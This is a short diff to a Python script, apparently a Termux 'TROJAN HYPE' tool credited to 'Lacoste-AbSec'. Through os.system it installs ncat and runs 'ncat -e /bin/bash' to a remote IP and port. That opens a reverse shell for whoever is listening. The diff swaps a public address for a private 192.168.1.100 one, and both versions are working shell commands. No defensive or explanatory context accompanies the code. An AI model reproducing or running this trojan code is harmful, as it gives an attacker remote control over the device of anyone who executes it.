@@ -31,7 +31,7 @@ import os
 import time 
 
 os.system ("pkg install nmap-ncat -y")
-os.system ("ncat -e /bin/bash 143.137.117.28 1533")
+os.system ("ncat -e /bin/bash 192.168.1.100 3333")
 os.system ('clear')
 os.system ('figlet -f slant TROJAN HYPE') 
 print (f'{XV} Script by{XXI}:{O}Lacoste-AbSec{XXI}')
